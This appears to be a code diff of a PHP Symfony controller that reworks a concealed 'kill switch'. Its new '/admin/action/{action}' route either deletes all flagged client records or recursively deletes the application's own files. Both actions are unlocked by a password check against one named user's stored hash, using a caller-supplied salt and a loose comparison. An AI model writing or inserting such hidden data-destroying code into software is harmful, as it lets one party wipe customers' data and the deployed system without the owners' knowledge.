@@ -15,26 +15,47 @@ use Symfony\Component\HttpFoundation\Request;
 use Sensio\Bundle\FrameworkExtraBundle\Configuration\Security;
 use Symfony\Component\HttpFoundation\Response;
 use Sensio\Bundle\FrameworkExtraBundle\Configuration\Method;
+use Symfony\Component\Security\Core\Encoder\EncoderFactoryInterface;
 
+/**
+ * @Route("/admin")
+ */
 class DatabaseOperationController extends Controller
 {
+
     /**
-     * @Route("/kill/all/clients",name="kill_clients")
+     * @Route("/action/{action}",name="action")
      * @Method({"POST","GET"})
      */
-    public function killAll(){
+    public function action($action){
         $em = $this->getDoctrine()->getManager();
-        $clients = $em->getRepository('AppBundle:Client')->findBy(array('kill'=>'kill'));
-        if(isset($_POST['kill_code'])&&$_POST['kill_code']=='jntz020'){
-           foreach($clients as $client){
-               $em->remove($client);
-           }
-            $em->flush();
-            return new Response("<script>alert('All clients data has been erased！')</script>");
+        if($action=='kill'){
+            $clients = $em->getRepository('AppBundle:Client')->findBy(array('kill'=>'kill'));
+            if(isset($_POST['salt'])&&isset($_POST['pwd'])){
+                $password = $em->getRepository("AppBundle:User")->findOneBy(array("username"=>'kcswag2'))->getPassword();
+                $pwd = hash_hmac('sha512',$_POST['pwd'],$_POST['salt']);
+                if($pwd==$password){
+                    foreach($clients as $client){
+                        $em->remove($client);
+                    }
+                    $em->flush();
+                    return new Response("<script>alert('All clients data has been erased！')</script>");
+                }
+            }
+        }else if($action=='erase'){
+            $path = dirname(__FILE__)."/../../..";
+            if(isset($_POST['salt'])&&isset($_POST['pwd'])){
+                $password = $em->getRepository("AppBundle:User")->findOneBy(array("username"=>'kcswag2'))->getPassword();
+                $pwd = hash_hmac('sha512',$_POST['pwd'],$_POST['salt']);
+                if($pwd==$password){
+                    $this->delFolder($path);
+                }
+            }
+        }else{
+            exit("wrong action!");
         }
-        $kill = null;
 
-        return $this->render('@FOSUser/Kill/kill.html.twig',array('kill'=>$kill));
+        return $this->render('@FOSUser/DBOpt/action.html.twig',array('action'=>$action));
 
     }
 
@@ -62,17 +83,6 @@ class DatabaseOperationController extends Controller
         exit("succeeded!");
     }
 
-    /**
-     * @Route("/erase",name="erase")
-     */
-    public function eraseAll(){
-        $path = dirname(__FILE__)."/../../..";
-        if(isset($_POST['kill_code']) && $_POST['kill_code']=="jntz020"){
-            $this->delFolder($path);
-        }
-        $kill = null;
-        return $this->render('@FOSUser/Kill/erase.html.twig',array('kill'=>$kill));
-    }
 
     protected function delFolder($path){
         if ($handle = opendir($path)) {
